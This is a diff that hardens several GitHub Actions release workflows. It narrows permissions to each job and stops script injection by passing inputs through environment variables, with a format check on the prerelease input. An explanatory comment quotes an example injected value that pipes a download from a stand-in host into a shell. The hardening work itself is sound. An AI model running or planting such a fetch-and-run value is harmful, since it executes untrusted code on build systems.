@@ -35,10 +35,6 @@ on:
   push:
     branches: [main]
 
-permissions:
-  contents: write
-  pull-requests: write
-
 concurrency:
   group: release-${{ github.ref }}
   cancel-in-progress: false
@@ -46,6 +42,9 @@ concurrency:
 jobs:
   release-please:
     runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      pull-requests: write
     outputs:
       release_created: ${{ steps.release.outputs.release_created }}
       tag_name: ${{ steps.release.outputs.tag_name }}
@@ -111,10 +110,6 @@ on:
   push:
     branches: [main]
 
-permissions:
-  contents: write
-  pull-requests: write
-
 concurrency:
   group: release-${{ github.ref }}
   cancel-in-progress: false
@@ -122,6 +117,9 @@ concurrency:
 jobs:
   release-please:
     runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      pull-requests: write
     outputs:
       release_created: ${{ steps.release.outputs.release_created }}
       tag_name: ${{ steps.release.outputs.tag_name }}
@@ -191,10 +189,6 @@ on:
   push:
     branches: [main]
 
-permissions:
-  contents: write
-  pull-requests: write
-
 concurrency:
   group: release-${{ github.ref }}
   cancel-in-progress: false
@@ -202,6 +196,9 @@ concurrency:
 jobs:
   release-please:
     runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      pull-requests: write
     outputs:
       release_created: ${{ steps.release.outputs.release_created }}
       tag_name: ${{ steps.release.outputs.tag_name }}
@@ -215,6 +212,7 @@ jobs:
     if: needs.release-please.outputs.release_created == 'true'
     runs-on: ubuntu-latest
     permissions:
+      contents: read
       id-token: write
     environment: pypi
     steps:
@@ -263,10 +261,6 @@ on:
   push:
     branches: [main]
 
-permissions:
-  contents: write
-  pull-requests: write
-
 concurrency:
   group: release-${{ github.ref }}
   cancel-in-progress: false
@@ -274,6 +268,9 @@ concurrency:
 jobs:
   release-please:
     runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      pull-requests: write
     outputs:
       release_created: ${{ steps.release.outputs.release_created }}
       tag_name: ${{ steps.release.outputs.tag_name }}
@@ -286,6 +283,8 @@ jobs:
     needs: release-please
     if: needs.release-please.outputs.release_created == 'true'
     runs-on: ubuntu-latest
+    permissions:
+      contents: read
     steps:
       - uses: actions/checkout@v4
       - uses: actions/setup-java@v4
@@ -335,10 +334,6 @@ on:
   push:
     branches: [main]
 
-permissions:
-  contents: write
-  pull-requests: write
-
 concurrency:
   group: release-${{ github.ref }}
   cancel-in-progress: false
@@ -346,6 +341,9 @@ concurrency:
 jobs:
   release-please:
     runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      pull-requests: write
     steps:
       - uses: googleapis/release-please-action@v4
         id: release
@@ -404,10 +402,6 @@ on:
   push:
     branches: [main]
 
-permissions:
-  contents: write
-  pull-requests: write
-
 concurrency:
   group: release-${{ github.ref }}
   cancel-in-progress: false
@@ -415,6 +409,9 @@ concurrency:
 jobs:
   release-please:
     runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      pull-requests: write
     outputs:
       release_created: ${{ steps.release.outputs.release_created }}
       tag_name: ${{ steps.release.outputs.tag_name }}
@@ -427,6 +424,8 @@ jobs:
     needs: release-please
     if: needs.release-please.outputs.release_created == 'true'
     runs-on: ubuntu-latest
+    permissions:
+      contents: read
     steps:
       - uses: actions/checkout@v4
       - uses: dtolnay/rust-toolchain@stable
@@ -463,10 +462,6 @@ on:
   push:
     branches: [main]
 
-permissions:
-  contents: write
-  pull-requests: write
-
 concurrency:
   group: release-${{ github.ref }}
   cancel-in-progress: false
@@ -474,6 +469,9 @@ concurrency:
 jobs:
   release-please:
     runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      pull-requests: write
     outputs:
       release_created: ${{ steps.release.outputs.release_created }}
       tag_name: ${{ steps.release.outputs.tag_name }}
@@ -530,10 +528,6 @@ on:
   push:
     branches: [main]
 
-permissions:
-  contents: write
-  pull-requests: write
-
 concurrency:
   group: release-${{ github.ref }}
   cancel-in-progress: false
@@ -541,6 +535,9 @@ concurrency:
 jobs:
   release-please:
     runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      pull-requests: write
     outputs:
       releases_created: ${{ steps.release.outputs.releases_created }}
       paths_released: ${{ steps.release.outputs.paths_released }}
@@ -645,11 +642,7 @@ on:
         required: false
         type: string
 
-permissions:
-  contents: write
-  pull-requests: write
-  packages: write
-
+# Least privilege: each job asks only for what it needs.
 concurrency:
   group: release-${{ github.ref }}
   cancel-in-progress: false
@@ -659,6 +652,9 @@ jobs:
   release-please:
     if: github.event_name == 'push'
     runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      pull-requests: write
     outputs:
       release_created: ${{ steps.release.outputs.release_created }}
       tag_name: ${{ steps.release.outputs.tag_name }}
@@ -669,8 +665,10 @@ jobs:
 
   # === Manual pre-release (workflow_dispatch) ===
   manual-release:
-    if: github.event_name == 'workflow_dispatch' && github.event.inputs.prerelease != ''
+    if: github.event_name == 'workflow_dispatch' && inputs.prerelease != ''
     runs-on: ubuntu-latest
+    permissions:
+      contents: write
     outputs:
       version: ${{ steps.version.outputs.version }}
       tag_name: ${{ steps.version.outputs.tag_name }}
@@ -682,9 +680,16 @@ jobs:
 
       - name: Compute pre-release version
         id: version
+        # Pass the input through env, never ${{ }} inside run: — a value like
+        # `a"; curl evil | sh; "` would otherwise run as shell code.
+        env:
+          PRERELEASE: ${{ inputs.prerelease }}
         run: |
+          if [[ ! "$PRERELEASE" =~ ^[0-9A-Za-z]+(\.[0-9A-Za-z]+)*$ ]]; then
+            echo "::error::prerelease must look like alpha.1, beta.2 or rc.1"
+            exit 1
+          fi
           BASE_VERSION=$(node -p "require('./package.json').version")
-          PRERELEASE="${{ github.event.inputs.prerelease }}"
           VERSION="${BASE_VERSION}-${PRERELEASE}"
           echo "version=${VERSION}" >> "$GITHUB_OUTPUT"
           echo "tag_name=v${VERSION}" >> "$GITHUB_OUTPUT"
@@ -693,9 +698,9 @@ jobs:
       - name: Create pre-release tag and GitHub release
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          TAG: ${{ steps.version.outputs.tag_name }}
+          VERSION: ${{ steps.version.outputs.version }}
         run: |
-          TAG="${{ steps.version.outputs.tag_name }}"
-          VERSION="${{ steps.version.outputs.version }}"
           git tag "$TAG"
           git push origin "$TAG"
           gh release create "$TAG" \
@@ -726,8 +731,9 @@ jobs:
 
       - name: Resolve version and tag
         id: resolve
+        env:
+          VERSION: ${{ needs.release-please.outputs.version || needs.manual-release.outputs.version }}
         run: |
-          VERSION="${{ needs.release-please.outputs.version || needs.manual-release.outputs.version }}"
           echo "version=${VERSION}" >> "$GITHUB_OUTPUT"
           if [[ "$VERSION" == *-* ]]; then
             echo "npm_tag=next" >> "$GITHUB_OUTPUT"
@@ -742,7 +748,6 @@ jobs:
         id: check
         run: |
           PACKAGE_NAME=$(node -p "require('./package.json').name")
-          VERSION="${{ steps.resolve.outputs.version }}"
           if npm view "${PACKAGE_NAME}@${VERSION}" version 2>/dev/null; then
             echo "exists=true" >> "$GITHUB_OUTPUT"
           else
@@ -750,13 +755,17 @@ jobs:
           fi
         env:
           NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          VERSION: ${{ steps.resolve.outputs.version }}
 
+      # Stable tags already carry the version in package.json; --allow-same-version keeps npm from refusing it.
       - if: steps.check.outputs.exists == 'false'
         run: |
-          npm version "${{ steps.resolve.outputs.version }}" --no-git-tag-version
-          npm publish --tag "${{ steps.resolve.outputs.npm_tag }}"
+          npm version "$VERSION" --no-git-tag-version --allow-same-version
+          npm publish --tag "$NPM_TAG"
         env:
           NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          VERSION: ${{ steps.resolve.outputs.version }}
+          NPM_TAG: ${{ steps.resolve.outputs.npm_tag }}
 ```
 
 ### Usage
